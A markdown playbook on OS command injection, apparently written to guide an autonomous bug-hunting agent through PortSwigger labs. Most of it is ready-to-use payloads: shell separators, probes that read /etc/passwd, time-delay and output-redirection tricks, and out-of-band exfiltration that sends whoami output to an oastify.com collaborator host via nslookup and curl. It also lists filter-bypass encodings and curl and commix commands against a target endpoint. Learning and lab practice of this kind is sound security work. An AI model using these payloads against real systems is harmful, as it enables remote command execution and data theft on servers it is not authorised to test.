# OS Command Injection Methodology
## Expert-Level Playbook for Autonomous Bug Hunting

> User input reaches a shell. Inject metacharacters to run your own commands.
> Covers in-band, blind, and out-of-band variants.

---

## Phase 1: Detection & Fingerprinting

### 1.1 Candidate Sinks
- Features that shell out: ping/traceroute, DNS lookup, PDF/image conversion,
  file operations, product/stock checks, feedback that emails, git/tar wrappers
- Any param that looks like it feeds a system utility (`storeId`, `host`, `file`)

### 1.2 Injection Separators
```
;   |   ||   &   &&   `cmd`   $(cmd)   %0a (newline)   \n
# Windows also: & | %0d%0a
```

### 1.3 First Probe (in-band)
```
storeId=1; echo INJECT_MARKER
host=127.0.0.1 && whoami
file=x`id`
```

---

## Phase 2: Exploitation Techniques

### 2.1 In-Band (output reflected)
```
& whoami &
| cat /etc/passwd
; id ;
$(cat /etc/passwd)
```

### 2.2 Blind — Time-Based
```
& ping -c 10 127.0.0.1 &      # ~10s delay confirms execution
& sleep 10 &
`sleep 10`
```

### 2.3 Blind — Output Redirection
- Write command output somewhere web-readable, then fetch it:
```
& whoami > /var/www/images/out.txt &
GET /images/out.txt
```

### 2.4 Blind — Out-of-Band (OAST)
```
& nslookup `whoami`.OASTID.oastify.com &
& curl http://OASTID.oastify.com/$(whoami) &
```
- Exfiltrate command output as a subdomain / URL path to your collaborator.

### 2.5 Filter & Space Bypasses
```
# Spaces filtered
cat</etc/passwd            ${IFS}            {cat,/etc/passwd}
# Keyword filters
w'h'o'am'i     wh$()oami     /???/c?t /etc/passwd
# Encoding
$(printf '\x77\x68\x6f\x61\x6d\x69')
```

---

## Phase 3: PortSwigger Lab-Specific Techniques
- **Simple case**: `storeID=1; whoami` (output reflected).
- **Blind with time delays**: inject `& ping -c 10 127.0.0.1 &`.
- **Blind with output redirection**: write to the web root, then GET it.
- **Blind with out-of-band interaction**: `nslookup` to Burp Collaborator.
- **Blind OOB data exfiltration**: prepend `whoami` output as the subdomain.
- Target parameters are often the email `name`/`subject` or stock `storeId`.

---

## Phase 4: Tools & Automation
```bash
# Manual probes with curl
curl -sk "http://target/stock" --data "storeId=1;whoami"

# Commix automates detection + exploitation
commix -u "http://target/stock" --data "storeId=1" --batch
```
- Collaborator/interactsh for OOB confirmation and exfiltration.

---

## Common Failure Modes & Solutions
| Problem | Solution |
|---------|----------|
| No output shown | Switch to time-based, then OOB |
| Spaces blocked | `${IFS}`, `<`, `{cmd,arg}` |
| Keywords filtered | Quote-splitting, wildcards, encoding |
| Egress blocked | Redirect output to a web-readable path |

## Success Criteria
- [ ] Confirmed command execution (marker, delay, or OAST hit)
- [ ] Exfiltrated required output (e.g. `whoami`, file contents)
- [ ] Lab shows "solved"
